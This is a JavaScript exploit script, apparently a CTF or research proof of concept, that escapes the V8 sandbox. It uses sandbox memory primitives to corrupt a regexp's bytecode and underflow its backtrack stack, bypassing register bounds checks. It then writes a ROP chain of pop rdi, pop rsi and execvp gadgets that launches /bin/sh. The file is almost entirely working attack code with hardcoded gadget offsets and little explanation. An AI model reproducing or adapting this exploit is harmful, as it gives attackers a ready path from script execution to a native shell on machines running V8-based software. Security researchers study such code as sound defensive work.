var DEBUG = false;

var buf = new ArrayBuffer(8);
var dv = new DataView(buf);

function assert(x, msg) {
    if (msg === undefined) msg = ""
    if (!x) throw "Assetion failed: " + msg;
}

function dp(o) {
    if (DEBUG) eval("%DebugPrint(o)");
}
function hex(p) {
    return "0x" + p.toString(16);
}

function packU64(l, u) {
  return l | (u << 32n);
}

function u2f(u) {
    dv.setBigUint64(0, u, true);
    return dv.getFloat64(0, true);
}

function f2u(f) {
    dv.setFloat64(0, f, true);
    return dv.getBigUint64(0, true);
}

function s2u(s) { return s >>> 0; }

function lower(u) {
    return s2u(u & 0xffffffff);
}

function upper(u) {
    return parseInt(BigInt(u) >> 32n);
}



function printh(o) {
    console.log(hex(o));
}

function print(o) {
    console.log(o);
}


var memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
var addrof = (o) => Sandbox.getAddressOf(o);

var readHeap4 = (offset) => memory.getUint32(offset, true);
// var readHeap8 = (offset) => memory.getBigUint64(offset, true);
var writeHeap1 = (offset, value) => memory.setUint8(offset, value, true);
var writeHeap4 = (offset, value) => memory.setUint32(offset, value, true);
var writeHeap8 = (offset, value) => memory.setBigUint64(offset, value, true);


re = /a*b/;

re.exec("a".repeat(1) + "b");

print("sbx @ " + hex(Sandbox.base));
print("re @ " + hex(addrof(re)));
reDataAddr = readHeap4(addrof(re) + 0xc);
print("re->data @ " + hex(reDataAddr));
reBytecodeAddr = readHeap4(reDataAddr + 0x1c - 1);
print("re->bytecode @ " + hex(reBytecodeAddr));

function setUseBytecode(ree) {
    let reeDataAddr = readHeap4(addrof(ree) + 0xc);
    let reeCaptureCountAddr = reDataAddr + 0x30 - 1;
    writeHeap4(reeCaptureCountAddr, 0xfffffffe);
}

setUseBytecode(re);

function setBytecode(ree, bytecodeArr) {
    let reeDataAddr = readHeap4(addrof(ree) + 0xc);
    let reeBytecodeAddr = readHeap4(reeDataAddr + 0x1c - 1) - 1;
    let reeBytecodeSize = readHeap4(reeBytecodeAddr + 4) >> 1;
    assert(bytecodeArr.length <= reeBytecodeSize, "bytecode does not fit!");

    for (let i = 0; i < bytecodeArr.length; i++) {
        writeHeap4(reeBytecodeAddr + 4*i + 8, bytecodeArr[i]);
    }
}

function setBytecodeAtOffset(ree, offset, bc) {
    let reeDataAddr = readHeap4(addrof(ree) + 0xc);
    let reeBytecodeAddr = readHeap4(reeDataAddr + 0x1c - 1) - 1;
    let reeBytecodeSize = readHeap4(reeBytecodeAddr + 4) >> 1;
    assert(bc.length == 2, "[opcode, operand]");

    for (let i = 0; i < bc.length; i++) {
        writeHeap4(reeBytecodeAddr + 4*offset + 4*i + 8, bc[i]);
    }
}


const PUSH_BT = 2;
const PUSH_REGISTER = 3;
const SET_REGISTER = 4;
const ADVANCE_REGISTER = 9;
const POP_REGISTER = 12;
const SUCCESS = 14;
const BACKTRACK_END_TO_TOTAL_COUNT_OFF = 0x22c;
const pop_rdi = 0x11ecf97;
const pop_rsi = 0x13232da;
const execvp = 0x28cb9d0;
const bin_sh = "/bin/sh";

real_bin_sh = addrof(bin_sh) + 12 + Sandbox.base;

console.log("real_bin_sh @", hex(real_bin_sh));

setBytecode(re, [POP_REGISTER | 0x000, // underflow the smallvector backtrack_stack
    PUSH_BT, 0x1, // overwrite backtrack_stack.data_.end_of_storage_
    POP_REGISTER | 0x000, POP_REGISTER | 0x000, POP_REGISTER | 0x000,
    POP_REGISTER | 0x100, ADVANCE_REGISTER | 0x100, BACKTRACK_END_TO_TOTAL_COUNT_OFF,
    PUSH_REGISTER | 0x100, // overwrite backtrack_stack.data_.end => &total_register_count_
    PUSH_BT, 0x666,   // overwrite total_register_count_ (bypass index bound checking)
    POP_REGISTER|0x100, // adjust stack for pushing and popping
    POP_REGISTER|0x100, 
    // The rest is same as original v8 sandbox escape via regexp oob
    // MOV REG 0x53 to 4, reg 4 now has high 32 bits of pie
    PUSH_REGISTER|0x5300, 
    POP_REGISTER|0x400, 
    // MOV REG 0x52 to 3
    PUSH_REGISTER|0x5200, 
    POP_REGISTER|0x300, 
    ADVANCE_REGISTER | 0x300, 0xfe806abe,// reg 3 now has pie lower 32 bits
    // MOV REG 0x3 to 0x5
    PUSH_REGISTER|0x300,
    POP_REGISTER|0x500,
    ADVANCE_REGISTER | 0x500, pop_rdi, // add offset of gadget
    // overwrite register 0x52 with reg 5 and overwrite register 0x53 with reg 4
    PUSH_REGISTER|0x500,
    POP_REGISTER|0x5200,
    PUSH_REGISTER|0x400,
    POP_REGISTER|0x5300,
    // Set register 0x54 and 0x55 to the address of /bin/sh
    SET_REGISTER|0x5400, lower(real_bin_sh),
    SET_REGISTER|0x5500, upper(real_bin_sh),
    // pop rsi gadget
    PUSH_REGISTER|0x300,
    POP_REGISTER|0x500,
    ADVANCE_REGISTER | 0x500, pop_rsi,
    PUSH_REGISTER|0x500,
    POP_REGISTER|0x5600,
    PUSH_REGISTER|0x400,
    POP_REGISTER|0x5700,
    // set 0
    SET_REGISTER|0x5800, 0,
    SET_REGISTER|0x5900, 0,
    // execvp
    PUSH_REGISTER|0x300,
    POP_REGISTER|0x500,
    ADVANCE_REGISTER | 0x500, execvp,
    PUSH_REGISTER|0x500,
    POP_REGISTER|0x5a00,
    PUSH_REGISTER|0x400,
    POP_REGISTER|0x5b00,
    SUCCESS
]);
console.log("Executing regexp...");
re.exec("aaaaaaaaaaaaaaaaaaaaaaaaab");
